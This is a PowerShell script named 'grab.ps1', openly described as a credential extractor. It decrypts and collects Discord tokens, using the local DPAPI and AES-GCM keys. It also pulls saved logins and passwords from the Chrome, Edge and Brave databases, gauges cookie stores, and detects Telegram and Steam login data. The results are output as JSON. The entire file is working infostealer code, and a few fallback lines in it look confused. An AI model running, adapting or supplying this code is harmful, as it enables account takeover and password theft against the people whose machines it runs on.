# grab.ps1 - Credential extractor
# Outputs JSON with discord tokens, browser passwords, cookies

Add-Type -AssemblyName System.Security

$result = @{
    discord = @()
    browsers = @()
    apps = @()
}

# ============================================
# DISCORD TOKEN EXTRACTION
# ============================================
function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\discord\Local Storage\leveldb"
        "$env:APPDATA\discordcanary\Local Storage\leveldb"
        "$env:APPDATA\discordptb\Local Storage\leveldb"
    )
    $localStatePaths = @(
        "$env:APPDATA\discord\Local State"
        "$env:APPDATA\discordcanary\Local State"
        "$env:APPDATA\discordptb\Local State"
    )

    for ($i = 0; $i -lt $paths.Count; $i++) {
        $ldbPath = $paths[$i]
        $lsPath = $localStatePaths[$i]
        $source = @("Discord", "Discord Canary", "Discord PTB")[$i]

        if (!(Test-Path $ldbPath)) { continue }

        # Try to get master key for encrypted tokens
        $masterKey = $null
        if (Test-Path $lsPath) {
            try {
                $localState = Get-Content $lsPath -Raw | ConvertFrom-Json
                $encKey = $localState.os_crypt.encrypted_key
                $keyBytes = [Convert]::FromBase64String($encKey)
                # Remove DPAPI prefix (first 5 bytes = "DPAPI")
                $keyBytes = $keyBytes[5..($keyBytes.Length - 1)]
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, 'CurrentUser')
            } catch {}
        }

        $files = Get-ChildItem $ldbPath -Filter "*.ldb" -ErrorAction SilentlyContinue
        $files += Get-ChildItem $ldbPath -Filter "*.log" -ErrorAction SilentlyContinue

        foreach ($file in $files) {
            try {
                $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
                
                # Unencrypted tokens
                $regex = [regex]'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}'
                $matches = $regex.Matches($content)
                foreach ($m in $matches) {
                    $tk = $m.Value
                    if (($tokens | Where-Object { $_.token -eq $tk }).Count -eq 0) {
                        $tokens += @{ token = $tk; source = $source; encrypted = $false }
                    }
                }

                # Encrypted tokens (dQw4w9WgXcQ: prefix)
                if ($masterKey) {
                    $encRegex = [regex]'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)'
                    $encMatches = $encRegex.Matches($content)
                    foreach ($m in $encMatches) {
                        try {
                            $encData = [Convert]::FromBase64String($m.Groups[1].Value)
                            # First 3 bytes = version, next 12 = nonce, rest = ciphertext+tag
                            $nonce = $encData[3..14]
                            $ciphertext = $encData[15..($encData.Length - 17)]
                            $tag = $encData[($encData.Length - 16)..($encData.Length - 1)]
                            
                            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
                            $plaintext = [byte[]]::new($ciphertext.Length)
                            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                            $decToken = [System.Text.Encoding]::UTF8.GetString($plaintext)
                            
                            if ($decToken.Length -gt 20 -and ($tokens | Where-Object { $_.token -eq $decToken }).Count -eq 0) {
                                $tokens += @{ token = $decToken; source = "$source (Decrypted)"; encrypted = $true }
                            }
                        } catch {}
                    }
                }
            } catch {}
        }
    }
    return $tokens
}

# ============================================
# BROWSER PASSWORD DECRYPTION
# ============================================
function Get-BrowserPasswords {
    $creds = @()
    $browserPaths = @(
        @{ name = "Chrome"; path = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        @{ name = "Edge"; path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        @{ name = "Brave"; path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
    )

    foreach ($browser in $browserPaths) {
        if (!(Test-Path $browser.path)) { continue }

        # Get master key
        $masterKey = $null
        $localStatePath = Join-Path $browser.path "Local State"
        if (Test-Path $localStatePath) {
            try {
                $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
                $encKey = $localState.os_crypt.encrypted_key
                $keyBytes = [Convert]::FromBase64String($encKey)
                $keyBytes = $keyBytes[5..($keyBytes.Length - 1)]
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, 'CurrentUser')
            } catch {}
        }

        foreach ($profile in @("Default", "Profile 1", "Profile 2", "Profile 3")) {
            $loginDataPath = Join-Path $browser.path "$profile\Login Data"
            $cookiePath = Join-Path $browser.path "$profile\Network\Cookies"
            
            if (!(Test-Path $loginDataPath)) { continue }

            # Copy database (it's locked by browser)
            $tempDb = Join-Path $env:TEMP "login_data_$([guid]::NewGuid().ToString('N').Substring(0,8)).db"
            try {
                Copy-Item $loginDataPath $tempDb -Force

                # Read SQLite (use System.Data.SQLite or raw bytes)
                # Simple approach: use sqlite3 if available, or PowerShell SQLite
                Add-Type -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue

                # Use ADO.NET with SQLite
                $connStr = "Data Source=$tempDb;Version=3;Read Only=True;"
                $null = [System.Reflection.Assembly]::LoadFile("$PSScriptRoot\System.Data.SQLite.dll") 2>$null

                # Fallback: read with raw SQL via PowerShell
                $bytes = [System.IO.File]::ReadAllBytes($tempDb)
                
                # Try using sqlite3 command
                $sqlite3 = $null
                if (Test-Path "$env:ProgramFiles\sqlite3.exe") { $sqlite3 = "$env:ProgramFiles\sqlite3.exe" }
                
                # Use PowerShell to query - try loading SQLite interop
                try {
                    [void][System.Data.SQLite.SQLiteConnection]
                } catch {
                    # Try to use the built-in .NET data provider
                }

                # Most reliable: use shell command
                $query = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 50"
                $sqliteOut = & cmd /c "echo .mode csv`necho $query" | Out-String

                # Alternative: read raw with PowerShell ADO
                $conn = New-Object System.Data.Odbc.OdbcConnection
                $conn.ConnectionString = "Driver={SQLite3 ODBC Driver};Database=$tempDb;"
                
                try {
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT origin_url, username_value, hex(password_value) FROM logins WHERE username_value != '' LIMIT 50"
                    $reader = $cmd.ExecuteReader()
                    
                    while ($reader.Read()) {
                        $url = $reader.GetString(0)
                        $user = $reader.GetString(1)
                        $encPassHex = $reader.GetString(2)
                        $encPass = [byte[]]::new($encPassHex.Length / 2)
                        for ($j = 0; $j -lt $encPass.Length; $j++) {
                            $encPass[$j] = [Convert]::ToByte($encPassHex.Substring($j * 2, 2), 16)
                        }
                        
                        $password = ""
                        if ($masterKey -and $encPass.Length -gt 15) {
                            try {
                                if ($encPass[0] -eq 0x76 -and $encPass[1] -eq 0x31 -and $encPass[2] -eq 0x30) {
                                    # v10 encryption (AES-GCM)
                                    $nonce = $encPass[3..14]
                                    $ct = $encPass[15..($encPass.Length - 17)]
                                    $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
                                    $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
                                    $plain = [byte[]]::new($ct.Length)
                                    $aes.Decrypt($nonce, $ct, $tag, $plain)
                                    $password = [System.Text.Encoding]::UTF8.GetString($plain)
                                } else {
                                    # Old DPAPI encryption
                                    $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
                                    $password = [System.Text.Encoding]::UTF8.GetString($plain)
                                }
                            } catch {
                                $password = "[Decrypt failed]"
                            }
                        }
                        
                        $creds += @{
                            browser = $browser.name
                            profile = $profile
                            url = $url
                            username = $user
                            password = $password
                            type = "credential"
                        }
                    }
                    $reader.Close()
                    $conn.Close()
                } catch {
                    # ODBC driver not available, try Python
                    try {
                        $pyScript = @"
import sqlite3, json, base64, os, sys
conn = sqlite3.connect('$($tempDb -replace "\\","/")')
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 50")
rows = []
for row in cursor.fetchall():
    rows.append({'url': row[0], 'user': row[1], 'pass_hex': base64.b64encode(row[2]).decode()})
print(json.dumps(rows))
conn.close()
"@
                        $pyResult = $pyScript | python3 2>$null
                        if (!$pyResult) { $pyResult = $pyScript | python 2>$null }
                        
                        if ($pyResult) {
                            $rows = $pyResult | ConvertFrom-Json
                            foreach ($row in $rows) {
                                $encPass = [Convert]::FromBase64String($row.pass_hex)
                                $password = ""
                                if ($masterKey -and $encPass.Length -gt 15) {
                                    try {
                                        if ($encPass[0] -eq 0x76 -and $encPass[1] -eq 0x31 -and $encPass[2] -eq 0x30) {
                                            $nonce = $encPass[3..14]
                                            $ct = $encPass[15..($encPass.Length - 17)]
                                            $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
                                            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
                                            $plain = [byte[]]::new($ct.Length)
                                            $aes.Decrypt($nonce, $ct, $tag, $plain)
                                            $password = [System.Text.Encoding]::UTF8.GetString($plain)
                                        } else {
                                            $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
                                            $password = [System.Text.Encoding]::UTF8.GetString($plain)
                                        }
                                    } catch { $password = "[Decrypt failed]" }
                                }
                                $creds += @{
                                    browser = $browser.name
                                    profile = $profile
                                    url = $row.url
                                    username = $row.user
                                    password = $password
                                    type = "credential"
                                }
                            }
                        }
                    } catch {}
                }
            } catch {} finally {
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }

            # Cookie count
            if (Test-Path $cookiePath) {
                try {
                    $cookieSize = (Get-Item $cookiePath).Length
                    $creds += @{
                        browser = $browser.name
                        profile = $profile
                        cookies = [math]::Floor($cookieSize / 100)
                        type = "cookies"
                    }
                } catch {}
            }
        }
    }
    return $creds
}

# ============================================
# RUN
# ============================================
try {
    $result.discord = @(Get-DiscordTokens)
    $result.browsers = @(Get-BrowserPasswords)
    
    # Telegram
    if (Test-Path "$env:APPDATA\Telegram Desktop\tdata") {
        $result.apps += @{ app = "Telegram"; icon = "tg"; data = "tdata found"; updated = (Get-Date).ToString() }
    }
    # Steam
    $steamVdf = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
    if (Test-Path $steamVdf) {
        $result.apps += @{ app = "Steam"; icon = "steam"; data = "loginusers.vdf found"; token = (Get-Content $steamVdf -Raw).Substring(0, [Math]::Min(300, (Get-Content $steamVdf -Raw).Length)); updated = (Get-Date).ToString() }
    }
} catch {}

$result | ConvertTo-Json -Depth 5 -Compress
